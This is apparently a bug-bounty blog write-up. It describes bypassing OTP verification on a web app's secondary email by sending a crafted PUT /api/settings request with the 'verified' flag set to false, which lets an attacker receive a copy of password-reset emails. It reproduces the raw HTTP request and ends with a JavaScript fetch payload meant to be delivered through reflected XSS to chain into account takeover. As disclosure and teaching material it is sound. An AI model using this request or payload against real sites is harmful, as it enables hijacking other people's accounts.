---
title: "Secondary Email OTP Verification Bypass Via Deletion Function"
date: 2026-07-28 00:00:00 +0000
categories: [Web, Bypass]
tags: [Authentication Bypass]
image:
  path: ../assets/img/POST(7)/thumb.gif
---

The Application Does Have a Secondary Email Field, To Make Users **Able to Login back** or **Mirror Their Messages That are Sent to the Main Email That the Account Made with** in The Case that It's **_Lost_** or the User **_Cannot Recieve Messages_** on the Main One (Pretty Simple) .

![](../assets/img/POST(7)/1.png)
*interface*

## Exploitation :

I will go as a normal user and request to edit my `Backup Email` and set a one . then, sees if there is another functions appeared after doing this action

![](../assets/img/POST(7)/2.png)
*send OTP*

![](../assets/img/POST(7)/3.png)
*status: verified*

![](../assets/img/POST(7)/5.png)
*api: verified*

hitting the **Edit** Button again, here I saw **Delete** Button

![](../assets/img/POST(7)/4.png)

Went to Burp and Saw that the Request Sent to the Server is

```http
PUT /api/settings HTTP/2
Host: www.<VALUE>.com
Cookie: <VALUE>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://www.<VALUE>.com/control_panel/settings
Content-Type: application/json
Uzlc: <VALUE>
X-Csrf-Token: <VALUE>
Content-Length: 55
Origin: https://www.<VALUE>.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="133", "Google Chrome";v="133"
Sec-Ch-Ua-Mobile: ?0
Priority: u=0
Te: trailers

{"email_secondary":"","email_secondary_verified":false}
```

I Manipulated the "email_secondary" key-value to `<VALUE>+attacker@gmail.com` and "email_secondary_verified" key-value set to `true` but it gave me that it requires a code

![](../assets/img/POST(7)/6.png)
*Auth not Deletion only*

so, the Deletion Function Instead of Delete it Verifies if the "email_secondary_verified" key-value set to `true`

but, I Tried the Same request with "email_secondary_verified" set to `false` and **it passed and gave me 200 OK**

![](../assets/img/POST(7)/7.png)
*Success*

as a Secure application if the "email_secondary_verified" key-value is `false` it should ask the user to enter the sent otp or resend a new one but since we injected this "email_secondary" key-value via the **Deletion Function** the Backend Really Didn't care about this key at all and Treated it as it's verified and really mirrored all messages to it as it's the main email .

![](../assets/img/POST(7)/13.png)
*status: not verified*

![](../assets/img/POST(7)/8.png)
*api: not verified*

now, for example let's try to get all account usernames associated with backup_email which equals the main_email

![](../assets/img/POST(7)/9.png)
*request with main email*

and the Same Message Sent to the **Main Email** and **Attacker Controlled Backup Email**

Containing the Same password reset url which is valid for Hour

![](../assets/img/POST(7)/12.png)
*Main email*

![](../assets/img/POST(7)/11.png)
*Attacker Backup email* 


### Ugly Truth :

this bug **Chained** to another Bugs like **RXSS** _**can Lead to Account Takeover**_ Since it's Only **One Step POST Request** 

1. reflected XSS (**sends the fetch request with the bypass  {_onestep_}**)
2. send **forgot username** with **_Main email_**
3. send **forgot password** with the given username(S)
4. **change the main email**

```js
fetch("/api/settings", {
  method: "PUT",
  headers: {
    "Content-Type": "application/json",
    "X-CSRF-Token": document.querySelector('meta[name="csrf-token"]')?.content
  },
  body: JSON.stringify({
    email_secondary: "<VALUE>",
    email_secondary_verified: false
  })
});
```

![](../assets/img/POST(7)/end.gif)